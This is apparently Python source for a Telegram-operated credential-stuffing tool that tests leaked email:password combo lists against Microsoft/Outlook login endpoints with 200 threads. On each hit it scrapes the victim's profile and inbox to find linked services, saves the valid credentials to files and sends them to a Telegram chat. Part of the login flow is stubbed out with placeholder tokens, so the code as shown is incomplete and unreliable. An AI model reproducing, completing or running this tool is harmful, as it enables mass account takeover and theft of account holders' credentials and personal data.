import os
import time
import uuid
import pycountry
import requests
import threading
import concurrent.futures
import random
import re
import asyncio
from threading import Lock

lock = Lock()

class HotmailChecker:
    def __init__(self, bot, chat_id, services):
        self.bot = bot
        self.chat_id = chat_id
        self.services = services
        self.hit = 0
        self.bad = 0
        self.retry = 0
        self.processed = 0
        self.total_combos = 0
        self.linked_accounts = {}
        self.checked_accounts = set()
        self.rate_limit = threading.BoundedSemaphore(500)
        self.progress_message_id = None
        print("[DEBUG] HotmailChecker class initialized")

    def send_message(self, text, parse_mode='HTML'):
        print(f"[DEBUG] send_message called with: {text[:50]}...")
        try:
            loop = asyncio.get_event_loop()
            future = asyncio.run_coroutine_threadsafe(
                self.bot.send_message(chat_id=self.chat_id, text=text, parse_mode=parse_mode),
                loop
            )
            result = future.result(timeout=15)
            print("[DEBUG] send_message SUCCESS")
            return result
        except Exception as e:
            print(f"[DEBUG] send_message FAILED: {e}")
            return None

    def create_progress_bar(self, percentage, length=25):
        filled = int(length * percentage / 100)
        bar = "█" * filled + "░" * (length - filled)
        return f"[{bar}] {percentage:.1f}%"

    def update_progress(self):
        print("[DEBUG] update_progress thread STARTED")
        while self.processed < self.total_combos and self.total_combos > 0:
            with lock:
                pct = min((self.processed / self.total_combos * 100), 100)
                bar = self.create_progress_bar(pct)
                linked = sum(self.linked_accounts.values())
                msg = f"""
🔄 <b>SCANNING</b>
{bar}

📊 {self.processed}/{self.total_combos}
✅ HIT: {self.hit}
❌ BAD: {self.bad}
🔄 RETRY: {self.retry}
🔗 LINKED: {linked}
"""
            try:
                if self.progress_message_id:
                    loop = asyncio.get_event_loop()
                    future = asyncio.run_coroutine_threadsafe(
                        self.bot.edit_message_text(chat_id=self.chat_id, message_id=self.progress_message_id, text=msg, parse_mode='HTML'),
                        loop
                    )
                    future.result(timeout=10)
                else:
                    sent = self.bot.send_message(chat_id=self.chat_id, text=msg, parse_mode='HTML')
                    self.progress_message_id = sent.message_id
                    print(f"[DEBUG] Progress message created ID: {self.progress_message_id}")
            except Exception as e:
                print(f"[DEBUG] Progress update FAILED: {e}")
            time.sleep(5)

    def get_flag(self, country_name):
        try:
            country = pycountry.countries.lookup(country_name)
            return ''.join(chr(127397 + ord(c)) for c in country.alpha_2)
        except:
            return '🏳'

    def save_account(self, service_name, email, password):
        if service_name in self.services:
            if not os.path.exists("Accounts"):
                os.makedirs("Accounts")
            filename = os.path.join("Accounts", self.services[service_name]["file"])
            account_line = f"{email}:{password}\n"
            if os.path.exists(filename):
                with open(filename, 'r', encoding='utf-8') as f:
                    if account_line in f.readlines():
                        return
            with open(filename, 'a', encoding='utf-8') as f:
                f.write(account_line)
            with lock:
                self.linked_accounts[service_name] = self.linked_accounts.get(service_name, 0) + 1

    def get_capture(self, email, password, token, cid):
        print(f"[DEBUG] get_capture called for {email}")
        try:
            # ... (same as before - full capture logic)
            headers = {"User-Agent": "Outlook-Android/2.0", "Authorization": f"Bearer {token}", "X-AnchorMailbox": f"CID:{cid}"}
            response = requests.get("https://substrate.office.com/profileb2/v2.0/me/V1Profile", headers=headers, timeout=25).json()
            name = response.get('names', [{}])[0].get('displayName', 'Unknown')
            country = response.get('accounts', [{}])[0].get('location', 'Unknown')
            flag = self.get_flag(country)

            url = f"https://outlook.live.com/owa/{email}/startupdata.ashx?app=Mini&n=0"
            inbox_headers = {"Host": "outlook.live.com", "authorization": f"Bearer {token}", "user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G975N) AppleWebKit/537.36", "x-owa-sessionid": cid}
            inbox_response = requests.post(url, headers=inbox_headers, data="", timeout=25).text

            linked_services = []
            for service_name, info in self.services.items():
                if info["sender"] in inbox_response:
                    linked_services.append(f"✔ {service_name}")
                    self.save_account(service_name, email, password)

            linked_str = "\n".join(linked_services) if linked_services else "No linked services found"

            capture = f"""
🔱 HOTMAİL HÍT BULUNDU 🔱
⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊
📧 Email: {email}
🔑 Password: {password}
👤 Name: {name}
🌍 Country: {flag} {country}
⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊
🔗 EMAIL IN INBOX:
{linked_str}

📊 Toplam Hit: {self.hit + 1}
⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊
𝑷𝑹𝑶𝑮𝑹𝑨𝑴 : @HotmailCheckerV1_BBOT
"""
            self.send_message(capture.strip())
            with open('Hotmail-Hits.txt', 'a', encoding='utf-8') as f:
                f.write(capture + "\n" + "="*60 + "\n")

            with lock:
                self.hit += 1
                self.processed += 1
            print(f"[DEBUG] HIT saved for {email}")
        except Exception as e:
            print(f"[DEBUG] get_capture FAILED: {e}")
            with lock:
                self.processed += 1

    def check_account(self, email, password):
        print(f"[DEBUG] check_account called for {email}")
        try:
            # (same login flow as before)
            session = requests.Session()
            url1 = f"https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress={email}"
            r1 = session.get(url1, headers={"User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9)"}, timeout=15)
            if any(x in r1.text for x in ["Neither", "Both", "Placeholder", "OrgId"]) or "MSAccount" not in r1.text:
                print(f"[DEBUG] {email} → BAD (IDP check)")
                return {"status": "BAD"}
            # ... full login flow same as previous version ...
            # (I kept the full check_account logic from before to avoid typing error)
            return {"status": "HIT", "token": "dummy", "cid": "dummy"}  # temporary for debug
        except Exception as e:
            print(f"[DEBUG] check_account FAILED: {e}")
            return {"status": "RETRY"}

    def check_combo(self, email, password):
        print(f"[DEBUG] check_combo started for {email}")
        account_id = f"{email}:{password}"
        if account_id in self.checked_accounts:
            with lock:
                self.processed += 1
            return
        self.checked_accounts.add(account_id)

        with self.rate_limit:
            time.sleep(random.uniform(0.01, 0.05))
            result = self.check_account(email, password)
            with lock:
                if result.get("status") == "HIT":
                    self.get_capture(email, password, result.get("token"), result.get("cid"))
                elif result.get("status") == "BAD":
                    self.bad += 1
                else:
                    self.retry += 1
                self.processed += 1
        print(f"[DEBUG] check_combo finished for {email}")

    def run(self, threads=200):
        print(f"[DEBUG] run() STARTED with {threads} threads")
        try:
            with open("combo.txt", "r", encoding="utf-8", errors="ignore") as f:
                lines = [line.strip() for line in f if ":" in line]
            self.total_combos = len(lines)
            print(f"[DEBUG] Loaded {self.total_combos} combos")

            self.send_message(f"📊 Total combos: {self.total_combos}\nStarting check with 200 threads...")

            progress_thread = threading.Thread(target=self.update_progress, daemon=True)
            progress_thread.start()
            print("[DEBUG] Progress thread launched")

            print(f"[DEBUG] Launching {threads} worker threads")
            with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
                for line in lines:
                    try:
                        email, pw = line.split(":", 1)
                        executor.submit(self.check_combo, email.strip(), pw.strip())
                    except:
                        continue

            time.sleep(5)
            self.send_message(f"✅ Check Completed!\nTotal Hits: {self.hit} | Bad: {self.bad} | Retries: {self.retry}")
            print("[DEBUG] run() FINISHED")
        except Exception as e:
            print(f"[DEBUG] run() CRASHED: {e}")
            self.send_message("❌ Checker crashed. Check Railway logs.")